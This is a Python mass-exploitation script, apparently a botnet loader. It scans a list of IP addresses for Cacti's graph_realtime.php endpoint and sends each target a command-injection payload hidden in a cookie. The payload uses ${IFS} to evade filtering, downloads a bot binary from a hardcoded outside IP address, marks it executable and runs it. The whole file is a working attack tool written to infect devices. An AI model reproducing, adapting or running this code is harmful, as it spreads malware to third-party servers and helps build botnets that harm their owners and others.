#! python !#

#Modified Linksys loader
#Turned P.O.C Into Exploit Loader
#By Turpzy don't ask for a list
#Device Name Is Cacti
#Should be easy enough to find
#sorry for not storing ip and bins in a string

import threading, sys, time, random, socket, subprocess, re, os, base64, struct, array, requests
from threading import Thread
from time import sleep
import requests
from requests.auth import HTTPDigestAuth
from urllib.parse import quote
from decimal import *	
ips = open(sys.argv[1], "r").readlines()
port = sys.argv[2]

if len(sys.argv) < 2:
    sys.exit("usage: python %s <input list> <port>" % (sys.argv[0]))

payload = ";wget${IFS}http://62.197.136.92:"+port+"/pumaxnxx/bot.x86${IFS};chmod${IFS}777${IFS}bot.x86;./bot.x86${IFS}0day"
cookies = {'Cacti': quote(payload)}

class rtek(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print("\033[93m[\033[92mCacti\033[93m] \033[33mTrying \033[32m- \033[93m[\033[92m"+ self.ip +"\033[93m] \033[92m- \033[93m(\033[91mNot Infecting\033[93m)\033[37m")
				url = "http://"+self.ip+"/graph_realtime.php?action=init"
				req = requests.get(url)
				if req.status_code == 200 and "poller_realtime.php" in req.text:
					print("\033[93m[\033[92mCacti\033[93m] \033[37mFound Possible Vulnerable Device \033[32m- \033[93m[\033[92m"+ self.ip +"\033[93m]\033[37m")
					requests.get(url, cookies=cookies, timeout=3)
				else:
					print("\033[93m[\033[92mCacti\033[93m] \033[91mDevice Not Vulnerable \033[32m- \033[93m[\033[92m"+ self.ip +"\033[93m]\033[37m")
			except Exception as e:
				pass
for ip in ips:
	try:
		n = rtek(ip)
		n.start()
		time.sleep(0.03)
	except:
		pass
